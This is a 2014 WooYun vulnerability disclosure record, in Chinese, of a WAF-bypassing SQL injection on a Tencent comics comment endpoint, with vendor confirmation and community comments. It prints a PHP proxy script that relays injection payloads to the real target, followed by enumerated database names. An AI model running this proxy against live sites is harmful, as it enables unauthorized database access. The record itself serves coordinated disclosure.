{"id": 1412, "wybug_id": "wooyun-2014-070427", "wybug_title": "再发一个腾讯的可绕过waf的SQL注射", "wybug_corp": "腾讯", "wybug_author": "Jannock", "wybug_date": "2014-07-31 11:08", "wybug_open_date": "2014-09-14 11:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向公众公开  简要描述： 再发一个腾讯的可绕过waf的SQL注射，与http://www.wooyun.org/bugs/wooyun-2014-067581同样原理来绕过waf的过滤，这应该是配置错误 详细说明：  注入点：http://ac.qq.com/CartoonComment/getCommentListPOSTobjid=2108再发一个代理代码：\n<?phperror_reporting(0);ini_set('max_execution_time', 0);header(\"Content-Type: text/html; charset=UTF-8\");$a= urlencode(stripslashes($_GET['s']));$a  = str_replace('+',\"%20\",$a);$data = \"objid=\".$a;do{$output= request_by_other($data);}while($output==\"\" || strstr($output,\"Implemented\"));echo $output;function request_by_other($post_string){    $context = array(        'http' => array(            'method' => 'POST',            'header' => 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0' .                        \"\\r\\n\".'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' .                        \"\\r\\n\".'X-Requested-With: XMLHttpRequest'.\"\\r\\n\".'Content-length:' . strlen($post_string),            'content' => $post_string)        );    $stream_context = stream_context_create($context);    $data = file_get_contents(\"http://ac.qq.com/CartoonComment/getCommentList\", false, $stream_context);    $data = $http_response_header[0].$data;    return $data;} ?>\navailable databases [8]:[*] db_dmpt_**********[*] db_dmpt_**********[*] db_dmpt_**********[*] db_dmpt_**********[*] db_dmpt_**********[*] db_dmpt_**********[*] information_schema[*] test   漏洞证明：  \n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-08-01 14:06 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-31 13:59 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  厉害啊。    \n     2014-08-01 14:16 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @猪猪侠 厉害啊    \n     2014-08-01 14:17 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  什么情况？一哥怎么变成普通白帽了？？？    \n     2014-08-01 14:21 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @魇 你眼睛真好使，同问    \n     2014-08-01 16:02 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  啪啪啪    \n     2014-08-01 16:54 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  膜拜一哥    \n     2014-08-01 19:58 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  神一样的存在    \n     2014-08-01 23:57 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  @猪猪侠 居然互赞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}